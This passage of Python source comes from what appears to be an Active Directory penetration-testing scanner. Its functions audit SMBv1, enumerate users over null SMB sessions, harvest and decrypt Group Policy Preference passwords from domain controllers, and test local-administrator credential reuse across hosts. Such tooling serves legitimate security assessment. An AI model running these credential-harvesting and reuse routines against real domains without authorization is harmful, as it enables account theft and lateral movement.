            "dcs": dc_hosts or None,
            "non_dcs": non_dc_hosts or None,
        }
        shell.update_report_field(domain, "smbv1_enabled", value_to_store)
        _record_smbv1_finding(shell, domain=domain, parsed=summary)
        _render_smbv1_summary(domain, summary)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error executing NetExec SMBv1 audit.")
        print_exception(show_locals=False, exception=exc)


def execute_smbv1_audit(shell: Any, *, domain: str, targets_file: str) -> None:
    """Probe SMBv1 exposure natively across ``targets_file`` hosts and record it.

    Live-probe fallback used only when the native SMB collector has not yet
    gathered SMBv1 posture for the hosts (see ``_collect_smbv1_hosts_from_graph``).
    """
    from adscan_internal.services.async_bridge import run_async_sync

    try:
        with open(targets_file, encoding="utf-8") as handle:
            all_hosts = [
                line.strip()
                for line in handle
                if line.strip() and not line.strip().startswith("#")
            ]
    except OSError:
        all_hosts = []

    vulnerable_hosts = run_async_sync(_probe_smbv1_hosts(all_hosts))
    _record_smbv1_audit(
        shell, domain=domain, all_hosts=all_hosts, vulnerable_hosts=vulnerable_hosts
    )


def run_smbv1_audit(shell: Any, *, domain: str) -> None:
    """Audit SMBv1 exposure for a domain.

    Prefers the SMBv1 posture the native SMB collector already gathered (the
    ``smb_v1`` Computer-node property); only when no host inventory carries that
    data does it fall back to a live per-host negotiate sweep over the resolved
    target scope.
    """
    graph_data = _collect_smbv1_hosts_from_graph(shell, domain=domain)
    if graph_data is not None:
        all_hosts, vulnerable_hosts = graph_data
        marked_domain = mark_sensitive(domain, "domain")
        print_info(
            f"SMBv1 posture from the native SMB collector for domain {marked_domain} "
            f"({len(all_hosts)} probed host(s), {len(vulnerable_hosts)} SMBv1-enabled)."
        )
        _record_smbv1_audit(
            shell,
            domain=domain,
            all_hosts=all_hosts,
            vulnerable_hosts=vulnerable_hosts,
        )
        return

    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    domain_data = shell.domains_data.get(domain, {})
    scope_preference = resolve_domain_service_scope_preference(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        domain_data=domain_data,
        prompt_title="Choose the target scope for SMB multi-host checks:",
    )
    targets_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=domain_data,
        scope_preference=scope_preference,
    )
    if not targets_file:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(f"No host targets are available for domain {marked_domain}.")
        return

    targeting_notice = consume_service_targeting_fallback_notice(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        source=source,
    )
    if targeting_notice:
        print_info(targeting_notice)

    marked_domain = mark_sensitive(domain, "domain")
    print_info(f"Auditing SMBv1 exposure in domain {marked_domain}")
    print_info_debug(
        f"[smb] using domain target file source={source} "
        f"for {marked_domain}: {mark_sensitive(targets_file, 'path')}"
    )
    print_info(
        f"SMBv1 audit scope: {mark_sensitive(source, 'detail')} "
        f"({count_target_file_entries(targets_file)} target(s))"
    )
    execute_smbv1_audit(shell, domain=domain, targets_file=targets_file)


def run_smb_scan(shell: Any, *, domain: str) -> None:
    """Perform the unauthenticated SMB scan steps for a domain."""
    if shell._is_ctf_domain_pwned(domain):
        return

    from adscan_internal import print_operation_header

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    print_operation_header(
        "Unauthenticated SMB Scan",
        details={
            "Domain": domain,
            "PDC": pdc,
            "Operations": "RID Cycling, Guest Session",
        },
        icon="🔒",
    )
    if not os.path.exists(domain_relpath(shell.domains_dir, domain, "smb")):
        os.makedirs(domain_relpath(shell.domains_dir, domain, "smb"), exist_ok=True)
    print_info_verbose(
        "[smb] Null session probe handled by native unauth sweep — skipping legacy path."
    )
    shell.do_rid_cycling(domain)
    shell.do_netexec_guest(domain)


def run_smb_null_enum_users(shell: Any, *, domain: str) -> None:
    """Create a domain users list via native SAMR over a null SMB session.

    Migrated from netexec ``smb --users -u '' -p ''`` to native SAMR. The
    output users.txt is written via the same shell helpers as the legacy
    path, so downstream consumers (spraying, ASREP, etc.) are unaffected.
    """
    import asyncio

    from adscan_internal.services.unauth_enrichment_service import (
        _open_null_smb_connection,
    )
    from adscan_internal.services.native_samr_service import (
        enumerate_samr_users_via,
    )

    marked_domain = mark_sensitive(domain, "domain")
    domain_data = shell.domains_data.get(domain, {}) or {}
    pdc = str(domain_data.get("pdc") or "").strip()
    if not pdc:
        print_error(
            f"PDC missing for domain {marked_domain}; cannot enumerate SMB users."
        )
        return

    print_info("Creating a SMB user list (native SAMR null session)")

    async def _run() -> tuple[list, str, str | None]:
        connection = await _open_null_smb_connection(pdc, 30)
        async with connection:
            _, login_err = await connection.login()
            if login_err is not None:
                raise login_err
            return await enumerate_samr_users_via(
                connection, domain_hint=domain, max_users=10000
            )

    try:
        samr_users, status, error = asyncio.run(_run())
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error(f"Error enumerating SMB users in domain {marked_domain}: {exc}")
        return

    if status == "denied":
        print_warning(
            f"SAMR null-session user enumeration denied on {marked_domain}. "
            f"Detail: {error or '-'}"
        )
        return
    if status == "error":
        print_error(
            f"SAMR null-session user enumeration failed on {marked_domain}: {error or '-'}"
        )
        return

    users = [u.username for u in samr_users if u.username]

    try:
        log_dir = domain_path(
            shell._get_workspace_cwd(), shell.domains_dir, domain, "smb"
        )
        os.makedirs(log_dir, exist_ok=True)
        with open(os.path.join(log_dir, "users_null.log"), "w", encoding="utf-8") as fh:
            fh.write("\n".join(users) + ("\n" if users else ""))
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_info_debug(f"[smb-null-users] failed to persist users_null.log: {exc}")

    shell._write_user_list_file(
        domain,
        "users.txt",
        users,
        merge_existing=True,
        update_source="SMB user enumeration",
    )
    shell._postprocess_user_list_file(
        domain,
        "users.txt",
        source="smb_users",
    )


def run_rid_cycling_local(shell: Any, *, domain: str) -> None:
    """Run RID cycling with --local-auth."""
    print_info("Checking RID cycling for local session")
    print_info_debug("Native LSARPC RID cycling · local-auth · RID 500..2000")
    execute_smb_rid_cycling(shell, domain=domain, rid_max=2000, local_auth=True)


def _resolve_smb_auth_for_domain(shell: Any, domain: str) -> tuple[str, str | None]:
    """Resolve SMB auth type + NetExec auth string for a domain."""
    domain_data = shell.domains_data.get(domain, {})
    auth_value = str(domain_data.get("auth") or "unauth").strip().lower()
    if auth_value in {"auth", "pwned"}:
        username = domain_data.get("username")
        password = domain_data.get("password")
        if username and password:
            return auth_value, shell.build_auth_nxc(username, password, domain)
        return auth_value, None
    return auth_value, None


def _ensure_domain_smb_log_path(shell: Any, domain: str, filename: str) -> str:
    """Ensure the SMB log directory exists for a domain and return a relative log path."""
    workspace_cwd = shell._get_workspace_cwd()
    smb_dir_abs = domain_path(workspace_cwd, shell.domains_dir, domain, "smb")
    os.makedirs(smb_dir_abs, exist_ok=True)
    return domain_relpath(shell.domains_dir, domain, "smb", filename)


def _resolve_dc_targets_for_gpp(shell: Any, target_domain: str) -> list[str]:
    """Resolve the list of DCs to scan for GPP credentials.

    Default policy: every DC of the target domain. GPP files are
    SYSVOL-replicated, but legacy FRS staging shares (``Replication``,
    ``SYSVOL_DFSR``, ``NtFrs``) typically only exist on the FRS source DC,
    which is often *not* the PDC. Walking every DC makes the harvester
    robust to that asymmetry; deduplication on ``(username, secret)``
    inside the harvester collapses replicated hits to one entry.

    Falls back to ``[pdc]`` when the DC inventory is unavailable (early
    in the scan flow, or in single-DC labs like HTB Active).
    """
    domain_data = shell.domains_data.get(target_domain, {}) or {}
    pdc = str(domain_data.get("pdc") or "").strip()

    raw_dcs = domain_data.get("dcs")
    dcs: list[str] = []
    if isinstance(raw_dcs, list):
        dcs = [str(x).strip() for x in raw_dcs if str(x).strip()]
    elif isinstance(raw_dcs, str) and raw_dcs.strip():
        dcs = [piece.strip() for piece in raw_dcs.split(",") if piece.strip()]

    targets: list[str] = []
    for dc in dcs + ([pdc] if pdc else []):
        if dc and dc not in targets:
            targets.append(dc)
    return targets


def _load_gpp_ip_hostname_inventory(shell: Any, domain: str) -> dict | None:
    """Load the workspace IP->hostname inventory for one domain, if available.

    Used to promote a raw-IP DC target to its FQDN so Kerberos service tickets
    bind to ``cifs/<fqdn>`` rather than the rejected ``cifs/<ip>``. Best-effort.
    """
    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
    domains_dir = getattr(shell, "domains_dir", None) or ""
    if not workspace_dir or not domains_dir:
        return None
    try:
        from adscan_internal.services.kerberos_hostname_inventory import (
            load_workspace_ip_hostname_inventory,
        )

        return (
            load_workspace_ip_hostname_inventory(
                workspace_dir=workspace_dir,
                domains_dir=domains_dir,
                domain=domain,
            )
            or None
        )
    except Exception:  # noqa: BLE001 - inventory is best-effort
        return None


async def _harvest_gpp_for_domain(
    shell: Any, *, target_domain: str, timeout_per_target: int = 60
):
    """Run the unified GPP harvester across every DC of ``target_domain``.

    Returns a :class:`GPPHarvestResult` covering both cpassword and
    autologon vectors. Auth mode is auto-resolved from ``domains_data``:
    authenticated creds when available (with NTLM->Kerberos fallback via
    ``smb_machine_with_fallback``), null session otherwise. Per-target
    failures are isolated — one denied or unreachable DC does not abort
    the rest.
    """
    import asyncio as _asyncio

    from adscan_internal.services.gpp_credential_harvester import (
        GPPHarvestResult,
        harvest_gpp_on_connection,
    )
    from adscan_internal.services.smb_transport import (
        SMBConfig,
        smb_machine_with_fallback,
    )
    from adscan_internal.services.unauth_enrichment_service import (
        _open_null_smb_connection,
    )

    targets = _resolve_dc_targets_for_gpp(shell, target_domain)
    base_cfg = _smb_config_for_auth(shell, target_domain)

    from adscan_internal.models.domain import resolve_dc_ip
    from adscan_internal.services.domain_posture import get_posture
    from adscan_internal.services.kerberos_spn_resolution import (
        resolve_spn_or_decide_ntlm,
    )

    _domains_data = getattr(shell, "domains_data", None) or {}
    _domain_entry = _domains_data.get(target_domain) or {}
    try:
        _gpp_posture = get_posture(_domains_data, domain=target_domain)
    except Exception:  # noqa: BLE001 - posture read is best-effort
        _gpp_posture = None
    _gpp_inventory = _load_gpp_ip_hostname_inventory(shell, target_domain)
    _domain_dc_ip = None
    try:
        _domain_dc_ip = resolve_dc_ip(_domain_entry)
    except Exception:  # noqa: BLE001
        _domain_dc_ip = None

    async def _harvest_one(target: str) -> GPPHarvestResult:
        try:
            if base_cfg is not None:
                # Per-target SMBConfig so we walk SYSVOL on every DC, not just
                # the PDC. ``smb_machine_with_fallback`` owns NTLM -> Kerberos
                # retry; the harvester only needs the underlying raw
                # ``connection`` exposed by the SMBMachine.
                #
                # ``target`` may be a raw IP. Each target is a DC, so resolve a
                # per-target FQDN for the SPN (``cifs/<fqdn>``) — ``cifs/<ip>``
                # is rejected by the KDC. The KDC for THIS DC is itself: set
                # ``kdc_ip=target`` only because the target IS a domain
                # controller; never default to the target when it is a member.
                _res = resolve_spn_or_decide_ntlm(
                    target_host=target,
                    domain=target_domain,
                    domains_data=_domains_data,
                    ip_hostname_inventory=_gpp_inventory,
                    resolver_ip=target,
                    posture_snapshot=_gpp_posture,
                    is_dc_target=True,
                )
                _spn_host = (
                    _res.spn_host
                    if _res.kerberos_viable and _res.spn_host
                    else (base_cfg.target_hostname or target)
                )
                cfg = SMBConfig(
                    target_ip=target,
                    target_hostname=_spn_host,
                    domain=base_cfg.domain,
                    username=base_cfg.username,
                    password=base_cfg.password,
                    nt_hash=base_cfg.nt_hash,
                    auth_domain=base_cfg.auth_domain,
                    # KDC is this DC (target). resolve_dc_ip is the realm DC and
                    # only used as a last resort so we never hit a non-KDC.
                    kdc_ip=target or _domain_dc_ip or base_cfg.kdc_ip,
                    timeout=base_cfg.timeout,
                    posture_snapshot=_gpp_posture,
                )
                async with smb_machine_with_fallback(cfg) as machine:
                    return await harvest_gpp_on_connection(
                        machine.connection, timeout=timeout_per_target
                    )

            connection = await _open_null_smb_connection(target, 30)
            async with connection:
                _, login_err = await connection.login()
                if login_err is not None:
                    r = GPPHarvestResult(
                        status="denied", error=f"{target}: {login_err}"
                    )
                    r.targets_walked.append(target)
                    return r
                return await harvest_gpp_on_connection(
                    connection, timeout=timeout_per_target
                )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            r = GPPHarvestResult(status="error", error=f"{target}: {exc}")
            r.targets_walked.append(target)
            return r

    aggregate = GPPHarvestResult()
    if not targets:
        aggregate.status = "skipped"
        aggregate.error = "no DC targets resolved"
        return aggregate

    per_target = await _asyncio.gather(*[_harvest_one(t) for t in targets])
    for r in per_target:
        aggregate.merge(r)
    if not aggregate.targets_walked:
        aggregate.targets_walked = list(targets)
    return aggregate


def _print_gpp_coverage_summary(
    *, label: str, result, requested_targets: list[str]
) -> None:
    """Print a one-line coverage summary so the operator sees what was walked.

    Useful when nothing is found — without this the operator can't tell
    whether SYSVOL was actually readable or whether every share denied.
    Coverage gaps explain "no findings" better than a bare "not found"
    message and hint at retrying with higher-privilege creds.
    """
    from adscan_internal.services.gpp_credential_harvester import (
        DEFAULT_GPP_SHARES,
    )

    shares_walked = result.shares_walked or []
    shares_total = len(DEFAULT_GPP_SHARES)
    targets_total = len(requested_targets) or len(result.targets_walked or [])
    targets_walked = len(result.targets_walked or [])

    if shares_walked:
        walked_str = ", ".join(shares_walked)
        print_info_verbose(
            f"[{label}] coverage — "
            f"{targets_walked}/{targets_total} DC(s) walked, "
            f"{len(shares_walked)}/{shares_total} share(s) readable: {walked_str}"
        )
    else:
        print_info_verbose(
            f"[{label}] coverage — no shares readable on any DC; "
            f"GPP files cannot be inspected with the current credentials."
        )


def _synthesize_netexec_autologin_stdout(pdc: str, autologin_leaks: list) -> str:
    """Build NetExec-shaped autologin output for ``execute_netexec_gpp``.

    The canonical credential ingestion pipeline parses NetExec's
    ``-M gpp_autologin`` output via
    :func:`parse_netexec_gpp_autologin_credentials`. Reproduce that exact
    line shape so the native harvester plugs into the existing pipeline
    without changing the consumer.
    """
    # IMPORTANT: the execute_netexec_gpp consumer detects findings via substring
    # search: "found" in output AND ("autologon"/"autologin" in output). The
    # header and negative-case lines must NOT trigger that combination when
    # autologin_leaks is empty — otherwise execute_netexec_gpp marks the report
    # as "gpp_autologin = True" with zero credentials (false positive).
    # The [+] positive lines deliberately keep "Found credentials in" and the
    # file path ending in "Registry.xml" so the credential parser still matches.
    # Header contains "autologon" so execute_netexec_gpp's substring detector
    # ("autologon" in output) can fire when there ARE findings. The negative-case
    # line deliberately avoids "found" so the full condition
    # ("found" AND "autologon") stays False when leaks is empty.
    lines: list[str] = [
        f"SMB         {pdc:<16} 445    DC               [*] native-gpp-walker (autologon search)"
    ]
    for leak in autologin_leaks:
        lines.append(
            f"SMB         {pdc:<16} 445    DC               [+] Found credentials in {leak.unc_path}"
        )
        lines.append(
            f"SMB         {pdc:<16} 445    DC               [+] Usernames: ['{leak.username}']"
        )
        lines.append(
            f"SMB         {pdc:<16} 445    DC               [+] Domains: ['{leak.domain or ''}']"
        )
        lines.append(
            f"SMB         {pdc:<16} 445    DC               [+] Passwords: ['{leak.password}']"
        )
    if not autologin_leaks:
        # No "found" + "autologon/autologin" — avoids the false-positive detection.
        lines.append(
            f"SMB         {pdc:<16} 445    DC               [-] No Registry.xml entries with DefaultPassword"
        )
    return "\n".join(lines) + "\n"


def run_gpp_autologin(shell: Any, *, target_domain: str) -> None:
    """Harvest GPP autologon credentials natively across every DC.

    Migrated from NetExec ``-M gpp_autologin`` (which itself shells out to
    ``Get-GPPAutologon.ps1``) to the native multi-DC harvester in
    :mod:`gpp_credential_harvester`. Walks SYSVOL/NETLOGON/Replication/
    SYSVOL_DFSR/NtFrs on every DC of ``target_domain`` looking for
    Registry.xml entries that set ``DefaultPassword`` /
    ``DefaultUserName`` / ``DefaultDomainName``. The harvested output is
    then funnelled through ``execute_netexec_gpp`` via a synthesized
    NetExec-shaped stdout so the credential ingestion / report-update /
    ambiguous-domain prompts remain byte-identical with the legacy path.
    """
    import asyncio
    import subprocess

    from adscan_internal.rich_output import mark_sensitive

    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return

    domain_data = shell.domains_data.get(target_domain, {}) or {}
    pdc = str(domain_data.get("pdc") or "").strip()
    auth_state = str(domain_data.get("auth") or "unauth").strip().lower()
    if not pdc:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"PDC missing for {marked_target_domain}; cannot harvest GPP autologon."
        )
        return

    auth_type_display = {
        "auth": "Authenticated",
        "guest": "Guest Session",
        "null": "Null Session",
        "pwned": "Authenticated",
        "unauth": "Null Session",
    }.get(auth_state, "Unknown")

    log_path = _ensure_domain_smb_log_path(shell, target_domain, "gpp_autologin.log")
    targets = _resolve_dc_targets_for_gpp(shell, target_domain)

    print_operation_header(
        "GPP Autologon Extraction",
        details={
            "Domain": target_domain,
            "DCs scanned": ", ".join(targets) or pdc,
            "Auth Type": auth_type_display,
            "Module": "native_gpp_walker",
            "Output": log_path,
        },
        icon="🔑",
    )

    try:
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None
        if loop is not None and loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                result = ex.submit(
                    asyncio.run, _harvest_gpp_for_domain(shell, target_domain=target_domain)
                ).result()
        else:
            result = asyncio.run(_harvest_gpp_for_domain(shell, target_domain=target_domain))
    except Exception as exc:
        telemetry.capture_exception(exc)
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(f"Error harvesting GPP autologon on {marked_target_domain}: {exc}")
        return

    print_info_debug(
        f"[gpp-autologon] harvest done — status={result.status} "
        f"targets={result.targets_walked} shares={result.shares_walked} "
        f"autologin_leaks={len(result.autologin_leaks)} cpassword_leaks={len(result.cpassword_leaks)} "
        f"error={result.error!r}"
    )
    for leak in result.autologin_leaks:
        print_info_debug(
            f"[gpp-autologon]   user={leak.username!r} domain={leak.domain!r} "
            f"share={leak.source_share!r}"
        )

    _print_gpp_coverage_summary(
        label="gpp-autologon", result=result, requested_targets=targets
    )

    synthetic_stdout = _synthesize_netexec_autologin_stdout(pdc, result.autologin_leaks)
    if result.autologin_leaks:
        # Only dump the full synthetic stdout when there's something to ingest;
        # otherwise it's pure noise (1 header + 1 "no entries" line).
        print_info_debug(
            f"[gpp-autologon] synthesized stdout ({len(synthetic_stdout)} chars):\n{synthetic_stdout}"
        )

    try:
        workspace_cwd = shell._get_workspace_cwd()
        log_path_abs = os.path.join(
            domain_path(workspace_cwd, shell.domains_dir, target_domain, "smb"),
            "gpp_autologin.log",
        )
        os.makedirs(os.path.dirname(log_path_abs), exist_ok=True)
        with open(log_path_abs, "w", encoding="utf-8") as fh:
            fh.write(synthetic_stdout)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_info_debug(f"[gpp] failed to persist gpp_autologin.log: {exc}")

    if result.status == "denied" and not result.has_findings:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_warning(
            f"GPP autologon walker denied on {marked_target_domain} "
            f"(no readable SYSVOL/NETLOGON/FRS-staging share on any DC). Detail: {result.error or '-'}"
        )

    fake_command = (
        f"native-gpp-walker --module autologin --domain {target_domain} "
        f"--targets {','.join(targets) or pdc} --log {log_path}"
    )
    fake_proc = subprocess.CompletedProcess(
        args=[fake_command],
        returncode=0,
        stdout=synthetic_stdout,
        stderr="",
    )
    original_run_command = getattr(shell, "run_command", None)
    try:
        shell.run_command = lambda *_args, **_kwargs: fake_proc
        print_info_debug("[gpp-autologon] calling execute_netexec_gpp...")
        shell.execute_netexec_gpp(fake_command, "autologin", target_domain)
        print_info_debug("[gpp-autologon] execute_netexec_gpp returned OK")
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_info_debug(f"[gpp-autologon] execute_netexec_gpp raised: {exc}")
    finally:
        if original_run_command is not None:
            shell.run_command = original_run_command

    if result.autologin_leaks:
        print_info_verbose(
            f"[gpp] native walker harvested {len(result.autologin_leaks)} "
            f"autologon credential(s) across {len(result.targets_walked)} target(s)."
        )


def run_gpp_passwords(shell: Any, *, target_domain: str) -> None:
    """Harvest GPP cpassword leaks natively across every DC.

    Migrated from netexec ``-M gpp_password`` (which itself shelled out to
    Get-GPPPassword.py) to the unified native harvester in
    :mod:`gpp_credential_harvester`. Walks SYSVOL/NETLOGON/Replication/
    SYSVOL_DFSR/NtFrs on every DC of ``target_domain``, decrypts each
    cpassword via the Microsoft-published static AES-256 key, and never
    invokes a subprocess.

    The downstream consumer ``execute_netexec_gpp`` expects a
    ``CompletedProcess``-shaped object whose ``stdout`` matches NetExec's
    GPP module output; we synthesise that shape so the credential
    ingestion, report-field updates, and ambiguous-domain confirmation
    flow remain byte-identical with the legacy path.
    """
    import asyncio
    import subprocess

    from adscan_internal.rich_output import mark_sensitive

    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return

    domain_data = shell.domains_data.get(target_domain, {}) or {}
    pdc = str(domain_data.get("pdc") or "").strip()
    auth_state = str(domain_data.get("auth") or "unauth").strip().lower()
    if not pdc:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"PDC missing for {marked_target_domain}; cannot harvest GPP passwords."
        )
        return

    auth_type_display = {
        "auth": "Authenticated",
        "guest": "Guest Session",
        "null": "Null Session",
        "pwned": "Authenticated",
        "unauth": "Null Session",
    }.get(auth_state, "Unknown")

    log_path = _ensure_domain_smb_log_path(shell, target_domain, "gpp_password.log")
    targets = _resolve_dc_targets_for_gpp(shell, target_domain)

    print_operation_header(
        "GPP Password Extraction",
        details={
            "Domain": target_domain,
            "DCs scanned": ", ".join(targets) or pdc,
            "Auth Type": auth_type_display,
            "Module": "native_gpp_walker",
            "Output": log_path,
        },
        icon="🔑",
    )

    try:
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None
        if loop is not None and loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                result = ex.submit(
                    asyncio.run, _harvest_gpp_for_domain(shell, target_domain=target_domain)
                ).result()
        else:
            result = asyncio.run(_harvest_gpp_for_domain(shell, target_domain=target_domain))
    except Exception as exc:
        telemetry.capture_exception(exc)
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(f"Error harvesting GPP passwords on {marked_target_domain}: {exc}")
        return

    print_info_debug(
        f"[gpp-password] harvest done — status={result.status} "
        f"targets={result.targets_walked} shares={result.shares_walked} "
        f"cpassword_leaks={len(result.cpassword_leaks)} error={result.error!r}"
    )
    for leak in result.cpassword_leaks:
        print_info_debug(
            f"[gpp-password]   user={leak.username!r} cleartext={'YES' if leak.cleartext else 'NO'} "
            f"xml_type={leak.xml_type!r} share={leak.source_share!r}"
        )

    _print_gpp_coverage_summary(
        label="gpp-password", result=result, requested_targets=targets
    )

    leaks = result.cpassword_leaks
    status = result.status
    error = result.error

    output_lines: list[str] = []
    output_lines.append(
        f"SMB         {pdc:<16} 445    DC               [*] gpp_password - native walker"
    )
    decrypted_count = 0
    for leak in leaks:
        username = leak.username or "<unknown>"
        password = leak.cleartext or ""
        unc_path = leak.unc_path or ""
        if password:
            decrypted_count += 1
            output_lines.append(
                f"SMB         {pdc:<16} 445    DC               [+] Found cpassword in {unc_path}"
            )
            output_lines.append(
                f"SMB         {pdc:<16} 445    DC               [+] userName: {username}"
            )
            output_lines.append(
                f"SMB         {pdc:<16} 445    DC               [+] Password: {password}"
            )
    if not leaks:
        output_lines.append(
            f"SMB         {pdc:<16} 445    DC               [-] No Group Policy credentials detected"
        )

    synthetic_stdout = "\n".join(output_lines) + "\n"

    try:
        workspace_cwd = shell._get_workspace_cwd()
        log_path_abs = os.path.join(
            domain_path(workspace_cwd, shell.domains_dir, target_domain, "smb"),
            "gpp_password.log",
        )
        os.makedirs(os.path.dirname(log_path_abs), exist_ok=True)
        with open(log_path_abs, "w", encoding="utf-8") as fh:
            fh.write(synthetic_stdout)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_info_debug(f"[gpp] failed to persist gpp_password.log: {exc}")

    if status == "denied":
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_warning(
            f"GPP walker denied on {marked_target_domain} (no readable SYSVOL/Replication "
            f"share). Detail: {error or '-'}"
        )

    fake_command = (
        f"native-gpp-walker --target {pdc} --domain {target_domain} --log {log_path}"
    )
    fake_proc = subprocess.CompletedProcess(
        args=[fake_command],
        returncode=0,
        stdout=synthetic_stdout,
        stderr="",
    )
    original_run_command = getattr(shell, "run_command", None)
    try:
        shell.run_command = lambda *_args, **_kwargs: fake_proc
        shell.execute_netexec_gpp(fake_command, "passwords", target_domain)
    finally:
        if original_run_command is not None:
            shell.run_command = original_run_command

    if leaks:
        print_info_verbose(
            f"[gpp] native walker harvested {len(leaks)} cpassword entry(ies); "
            f"{decrypted_count} decrypted."
        )


def run_local_cred_reuse(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
    prompt_dump_after_reuse: bool = False,
) -> dict[str, Any] | None:
    """Test local admin credential reuse across enabled computers."""
    from adscan_internal import print_operation_header

    cred_type = "Hash" if shell.is_hash(credential) else "Password"
    print_operation_header(
        "Local Administrator Credential Reuse Test",
        details={
            "Domain": domain,
            "Username": username,
            "Credential Type": cred_type,
            "Target": "All Enabled Computers",
            "Authentication": "Local",
            "Threads": "16",
        },
        icon="🔄",
    )

    import subprocess

    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    scope_preference = resolve_domain_service_scope_preference(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        prompt_title="Choose the target scope for SMB multi-host checks:",
    )
    targets_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        scope_preference=scope_preference,
    )
    if not targets_file:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(f"No host targets are available for domain {marked_domain}.")
        return None
    print_info(
        "Checking for local admin creds reuse (Please be patient, this might take a while on large domains)"
    )
    targeting_notice = consume_service_targeting_fallback_notice(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        source=source,
    )
    if targeting_notice:
        print_info(targeting_notice)
    print_info_debug(
        f"[smb] using domain target file source={source} "
        f"for {mark_sensitive(domain, 'domain')}: {mark_sensitive(targets_file, 'path')}"
    )
    print_info(
        f"SMB local-reuse scope: {mark_sensitive(source, 'detail')} "
        f"({count_target_file_entries(targets_file)} target(s))"
    )

    all_hosts = list(load_target_entries(targets_file))

    # Liveness re-gate on 445 — skip hosts down since the port scan so a stale
    # dead host does not stall a worker (mirrors run_auth_shares / the native SMB
    # privilege sweep).
    ordered_hosts = all_hosts
    if len(all_hosts) > 1:
        from adscan_internal.services.host_reachability_filter import (  # noqa: PLC0415
            filter_reachable_hosts_sync,
            print_reachability_summary,
        )

        reach = filter_reachable_hosts_sync(all_hosts, port=445)
        print_reachability_summary(reach, service_label="SMB")
        ordered_hosts = list(reach.reachable)

    # Mass-auth safety (sweep_credential SSOT): a local Administrator / local user
    # is NOT a domain principal — it has no Kerberos TGT to pre-mint, so this
    # sweep intentionally does NOT route through ``resolve_sweep_credential`` (same
    # carve-out the MSSQL SQL-auth branch takes). It is inherently domain-lockout
    # safe because every per-host config sets the credential domain to the TARGET
    # host itself (local-SAM validation), never the AD domain — so a wrong local
    # credential can only ever touch a per-machine local SAM, never a domain
    # account's badPwdCount.
    is_hash = bool(shell.is_hash(credential))
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415

    results = run_async_sync(
        _sweep_local_cred_reuse(
            ordered_hosts,
            domain=domain,
            username=username,
            credential=credential,
            is_hash=is_hash,
        )
    )
    synthetic_output = _synthesize_local_cred_reuse_output(results)

    # Persist the NetExec-shaped log the downstream renderer reads (the same
    # relative path the retired ``--log`` wrote). ``execute_local_cred_reuse``
    # parses THIS file — the synthetic CompletedProcess below carries empty
    # stdout so outcomes are counted exactly once (from the log, not twice).
    log_rel = f"domains/{domain}/smb/{username}_cred_reuse.txt"
    try:
        os.makedirs(os.path.dirname(log_rel), exist_ok=True)
        with open(log_rel, "w", encoding="utf-8") as handle:
            handle.write(synthetic_output)
    except OSError as exc:
        telemetry.capture_exception(exc)
        print_info_debug(
            f"[local_reuse] failed to persist {log_rel}: {exc}"
        )

    # Feed the untouched persistence + attack-graph + panel renderer
    # (``PentestShell.execute_local_cred_reuse``) via a synthetic CompletedProcess,
    # exactly like the native GPP walker feeds ``execute_netexec_gpp``. This keeps
    # the LocalAdminPassReuse edge creation and the reuse panels intact while the
    # data comes from the native aiosmb sweep instead of a netexec subprocess.
    fake_command = (
        f"native-smb-local-auth-sweep --domain {domain} --user {username}"
    )
    fake_proc = subprocess.CompletedProcess(
        args=[fake_command],
        returncode=0,
        stdout="",
        stderr="",
    )
    original_run_command = getattr(shell, "run_command", None)
    try:
        shell.run_command = lambda *_args, **_kwargs: fake_proc
        try:
            return shell.execute_local_cred_reuse(
                fake_command,
                domain,
                username,
                credential,
                prompt_dump_after_reuse=prompt_dump_after_reuse,
            )
        except TypeError:
            # Backward compatibility for shells that still expose the legacy signature.
            return shell.execute_local_cred_reuse(
                fake_command, domain, username, credential
            )
    finally:
        if original_run_command is not None:
            shell.run_command = original_run_command


async def _sweep_local_cred_reuse(
    hosts: list[str],
    *,
    domain: str,
    username: str,
    credential: str,
    is_hash: bool,
    timeout: int = 15,
    max_workers: int | None = None,
